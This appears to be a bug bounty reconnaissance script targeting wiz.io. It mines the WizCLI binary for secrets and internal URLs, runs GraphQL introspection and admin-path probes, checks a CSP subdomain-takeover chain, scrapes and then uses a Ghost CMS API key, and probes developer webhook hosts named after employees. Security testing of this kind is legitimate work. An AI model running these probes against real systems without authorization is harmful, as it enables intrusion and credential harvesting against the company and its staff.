#!/usr/bin/env zsh
# Phase 3 continuation — wiz.io
# Run this on the Pi. All output goes to ~/bug-bounty-hunting-/results/wiz.io/03-vulns/
# Usage: zsh ~/bug-bounty-hunting-/scripts/phase3-wiz-pi.sh

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:$HOME/go/bin:$HOME/.local/bin

RESULTS=~/bug-bounty-hunting-/results/wiz.io/03-vulns
mkdir -p "$RESULTS"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$RESULTS/phase3.log"; }
sep() { echo "================================================================" | tee -a "$RESULTS/phase3.log"; }

log "=== Phase 3 continuation — wiz.io ==="
sep

# ----------------------------------------------------------------
# A. WizCLI Binary Strings Extraction
# ----------------------------------------------------------------
log "ACTION A — WizCLI binary strings extraction"

if [ ! -f /tmp/wizcli ]; then
  log "Downloading wizcli binary (247MB)..."
  curl -s "https://downloads.wiz.io/v1/wizcli/latest/wizcli-linux-arm64" -o /tmp/wizcli
fi
chmod +x /tmp/wizcli
log "Binary size: $(ls -lh /tmp/wizcli | awk '{print $5}')"

/tmp/wizcli version 2>/dev/null | head -5 | tee -a "$RESULTS/wizcli-version.txt"

{
  echo "=== HARDCODED wiz.io URLs ==="
  strings /tmp/wizcli | grep -Ei "https?://[a-z0-9._-]*wiz\.io" | sort -u

  echo ""
  echo "=== GRAPHQL / API PATHS ==="
  strings /tmp/wizcli | grep -Ei "(/graphql|/api/v[0-9]|/v[0-9]+/[a-z]|/internal/|/admin/)" \
    | grep -v "\.png\|\.svg\|\.js\b\|\.css\b\|golang\.org\|google\.golang\|github\.com" | sort -u

  echo ""
  echo "=== CLOUD METADATA URLS ==="
  strings /tmp/wizcli | grep -Ei "(169\.254\.169\.254|metadata\.google\.internal|169\.254\.170\.2|imdsv2|instance-identity)" | sort -u

  echo ""
  echo "=== AUTH / JWT / CLIENT_ID ==="
  strings /tmp/wizcli | grep -Ei "(client_id|client_secret|audience|tenant_id|auth0|jwks_uri|issuer)" | sort -u

  echo ""
  echo "=== INTERNAL/PRIVATE HOST REFS ==="
  strings /tmp/wizcli | grep -Ei "(internal|private|localhost|127\.\|10\.\|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" \
    | grep -v "golang\.org\|internal/race\|internal/cpu\|internal/fmtsort\|internal/poll\|internal/syscall\|internal/testlog\|_test\b\|vendor\b" | sort -u | head -50

  echo ""
  echo "=== ALL URLs (non-wiz) ==="
  strings /tmp/wizcli | grep -Ei "https?://[a-z0-9._-]+\.[a-z]{2,}" | grep -v "wiz\.io\|golang\.org\|github\.com\|pkg\.go\.dev\|google\.com/go" | sort -u | head -60
} | tee "$RESULTS/wizcli-strings.txt"
log "WizCLI strings saved to $RESULTS/wizcli-strings.txt"
sep

# ----------------------------------------------------------------
# B. gh-109705.pr.test.wiz.io — GraphQL Introspection
# ----------------------------------------------------------------
log "ACTION B — gh-109705.pr.test.wiz.io GraphQL introspection"

TARGET="https://gh-109705.pr.test.wiz.io"

{
  echo "=== RESPONSE HEADERS ==="
  curl -sI "${TARGET}/" 2>/dev/null

  echo ""
  echo "=== PATH PROBE ==="
  for ep in /graphql /api/graphql /v1/graphql /query /api/query /api /health /_debug /_dev /internal; do
    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 "${TARGET}${ep}" 2>/dev/null)
    echo "${code}  ${ep}"
  done

  echo ""
  echo "=== GRAPHQL INTROSPECTION (no auth) ==="
  curl -sk --connect-timeout 10 -X POST "${TARGET}/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name } } } }"}' \
    2>/dev/null

  echo ""
  echo "=== JS BUNDLE URLS FROM PAGE ==="
  curl -sk "${TARGET}/" | grep -oE 'src="(/[^"]+\.js[^"]*)"' | sed 's/src="//;s/"//'

  echo ""
  echo "=== INTERNAL API REFS IN PAGE HTML ==="
  curl -sk "${TARGET}/" | grep -oE '"(https?://[^"]+wiz\.io[^"]*|/api/[^"]{3,}|/graphql[^"]*)"' | sort -u | head -40
} | tee "$RESULTS/gh109705-graphql.txt"
log "gh-109705 output saved to $RESULTS/gh109705-graphql.txt"

# Fetch first JS bundle and grep for API endpoints
FIRSTJS=$(curl -sk "${TARGET}/" | grep -oE 'src="(/[^"]+\.js[^"]*)"' | sed 's/src="//;s/"//' | head -1)
if [ -n "$FIRSTJS" ]; then
  log "Fetching JS bundle: ${TARGET}${FIRSTJS}"
  curl -sk "${TARGET}${FIRSTJS}" \
    | grep -oE '"(https?://[a-z0-9._/-]+wiz\.io[^"]{0,200}|/api/[^"]{3,100}|/graphql[^"]{0,100})"' \
    | sort -u | head -60 \
    | tee "$RESULTS/gh109705-js-endpoints.txt"
fi
sep

# ----------------------------------------------------------------
# C. www.wiz.io Full CSP — win-test chain validation
# ----------------------------------------------------------------
log "ACTION C — Full CSP dump + win-test.wiz.io takeover chain check"

{
  echo "=== FULL CSP: www.wiz.io ==="
  curl -sI "https://www.wiz.io/" 2>/dev/null | tr ',' '\n'

  echo ""
  echo "=== *.wiz.io subdomains in CSP ==="
  curl -sI "https://www.wiz.io/" 2>/dev/null \
    | grep -i "content-security-policy" \
    | grep -oE "[a-z0-9.*_-]+\.wiz\.io" | sort -u

  echo ""
  echo "=== vercel.app domains in CSP ==="
  curl -sI "https://www.wiz.io/" 2>/dev/null \
    | grep -i "content-security-policy" \
    | grep -oE "[a-z0-9.*_-]+\.vercel\.app" | sort -u

  echo ""
  echo "=== FULL CSP: app.wiz.io ==="
  curl -sI "https://app.wiz.io/" 2>/dev/null | tr ',' '\n'
} | tee "$RESULTS/csp-audit.txt"
log "CSP audit saved to $RESULTS/csp-audit.txt"

# Check if win-test.wiz.io appears in any CSP
if grep -qi "win-test" "$RESULTS/csp-audit.txt"; then
  log "!!! CRITICAL: win-test.wiz.io FOUND IN CSP — F001 escalates to Critical CSP bypass !!!"
  echo "CRITICAL_CSP_CHAIN=true" >> "$RESULTS/phase3.log"
fi
sep

# ----------------------------------------------------------------
# D. blog.wiz.io Ghost CMS Content API Key Extraction
# ----------------------------------------------------------------
log "ACTION D — blog.wiz.io Ghost CMS API key extraction"

{
  echo "=== 26-char hex tokens in page source ==="
  curl -sk "https://blog.wiz.io/" | grep -oE '[a-f0-9]{26}' | sort -u

  echo ""
  echo "=== API key patterns in source ==="
  curl -sk "https://blog.wiz.io/" | grep -oEi '(content.?api.?key|apiKey|ghost.?key|key:)[^"]*"[^"]+' | head -10

  echo ""
  echo "=== ghost-sdk.min.js key ==="
  curl -sk "https://blog.wiz.io/public/ghost-sdk.min.js" 2>/dev/null | grep -oE 'key:[^,}]+' | head -5

  echo ""
  echo "=== Ghost Admin API (should be auth-required) ==="
  curl -sI "https://blog.wiz.io/ghost/api/v3/admin/site/" 2>/dev/null | head -8
  curl -sI "https://blog.wiz.io/ghost/api/admin/site/" 2>/dev/null | head -8

  echo ""
  echo "=== Ghost Content API (no key — should fail gracefully) ==="
  curl -sk "https://blog.wiz.io/ghost/api/content/posts/" 2>/dev/null | head -c 400
  curl -sk "https://blog.wiz.io/ghost/api/v5.0/content/posts/" 2>/dev/null | head -c 400

  echo ""
  echo "=== Ghost members API ==="
  curl -sk "https://blog.wiz.io/members/api/site/" 2>/dev/null | head -c 400
} | tee "$RESULTS/blog-ghost-api.txt"
log "Ghost CMS output saved to $RESULTS/blog-ghost-api.txt"

# If a 26-char key found, attempt Content API read
GHOST_KEY=$(curl -sk "https://blog.wiz.io/" | grep -oE '[a-f0-9]{26}' | head -1)
if [ -n "$GHOST_KEY" ]; then
  log "!!! Ghost Content API key found: ${GHOST_KEY} — attempting read ==="
  curl -sk "https://blog.wiz.io/ghost/api/content/posts/?key=${GHOST_KEY}&limit=3&fields=title,url,visibility" \
    | python3 -m json.tool 2>/dev/null \
    | tee "$RESULTS/blog-ghost-posts.txt" | head -40
fi
sep

# ----------------------------------------------------------------
# E. tracking.wiz.io + team.wiz.io
# ----------------------------------------------------------------
log "ACTION E — tracking.wiz.io and team.wiz.io classification"

{
  echo "=== tracking.wiz.io headers ==="
  curl -sI "https://tracking.wiz.io/" 2>/dev/null

  echo ""
  echo "=== tracking.wiz.io body (first 500 bytes) ==="
  curl -sk "https://tracking.wiz.io/" | head -c 500

  echo ""
  echo "=== tracking.wiz.io path probe ==="
  for p in /health /api /v1 /status /pixel /t /track /collect /r /click /open; do
    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 5 "https://tracking.wiz.io${p}" 2>/dev/null)
    echo "${code}  ${p}"
  done

  echo ""
  echo "=== team.wiz.io headers ==="
  curl -sI "https://team.wiz.io/" 2>/dev/null

  echo ""
  echo "=== team.wiz.io path probe ==="
  for p in /health /api /v1 /users /members /teams /admin /.well-known/openid-configuration; do
    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 5 "https://team.wiz.io${p}" 2>/dev/null)
    echo "${code}  ${p}"
  done
} | tee "$RESULTS/tracking-team-probe.txt"
log "tracking+team output saved to $RESULTS/tracking-team-probe.txt"
sep

# ----------------------------------------------------------------
# F. Developer RDE endpoints — sampled
# ----------------------------------------------------------------
log "ACTION G — Developer RDE webhook probe"

{
  for host in \
    webhooks.guy.goldenberg.rde.wiz.io \
    webhooks.roey.dror-us.rde.wiz.io \
    webhooks.roy5.rde.wiz.io \
    webhooks.cfir.rde.wiz.io \
    webhooks.or.bin.rde.wiz.io \
    webhooks.on-demand-1.rde.wiz.io \
    webhooks.on-demand-5.rde.wiz.io \
    webhooks.bootstrap-rde-001.rde.wiz.io; do
    echo "=== $host ==="
    curl -sI --connect-timeout 8 "https://${host}/" 2>/dev/null | head -12
    BODY=$(curl -sk --connect-timeout 8 "https://${host}/" 2>/dev/null | head -c 300)
    echo "BODY: $BODY"
    echo ""
  done
} | tee "$RESULTS/rde-webhooks.txt"
log "RDE probe output saved to $RESULTS/rde-webhooks.txt"
sep

log "=== Phase 3 continuation COMPLETE ==="
log "Results in: $RESULTS/"
ls -la "$RESULTS/"
